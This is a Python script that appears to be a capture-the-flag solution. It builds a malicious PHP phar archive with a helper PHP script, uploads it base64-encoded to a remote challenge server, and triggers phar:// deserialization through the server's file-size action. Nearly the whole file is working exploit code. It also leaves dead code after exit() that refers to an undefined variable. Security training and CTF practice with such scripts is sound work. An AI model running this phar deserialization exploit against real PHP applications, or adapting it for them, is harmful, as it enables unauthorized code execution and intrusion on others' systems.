import re
import os
import sys
import base64
import requests
from time import *
os.popen('php phar_gen.php')
h = os.popen('hexdump -C phar.phar').read().strip()
print(h)
# sleep(0.5)
# phar_bin = open('phar.phar','rb').read()
# gif_008 = open('008.gif','rb').read()
# l = len(phar_bin)
# # split_point = 2
# all_phar = phar_bin
# open('phar.phar','wb').write(all_phar)
# # print()
# # exit()
sleep(0.5)

s = os.popen('php get_img_size.php phar://phar.phar/OAO.oAo phar.phar').read().strip()
print('---- has ? ----')
# exit()

# url = 'http://localhost/'
url = 'http://edu.kaibro.tw:12345/'
def upload(s):
	# s needs to be base64 encode
	post_data = {'c' : s}
	data = requests.post(url+'?action[]=upload',data=post_data).content
	idx = data.find(b'</code>')
	data = data[idx+6:]
	data = data.split(b'\n')[0].decode()
	path = re.search("'.*'",data).group(0)
	return path[1:-1]
def getsize(s):
	# s is the file path
	post_data = {'f' : s}
	res = requests.post(url+'?action[]=getsize',data=post_data)
	data = res.content.decode()
	idx = data.find('</code>')
	data = data[idx+6:]
	return data


phar_bin = open('phar.phar','rb').read()
p = base64.b64encode(phar_bin)
file_name = upload(p)
print('request: phar://' + file_name + '/OAO.oAo')
s = getsize('phar://' + file_name + '/OAO.oAo')
print(s)



exit()
url = 'http://edu.kaibro.tw:12345/'
post_data = {
	'f' : input_phar
}
get_data = {
	'action' : ['getsize']
}
res = requests.post(url,params=get_data,data=post_data)
data = res.content.decode()
idx = data.find('</code>')
data = data[idx+7:]
print(data)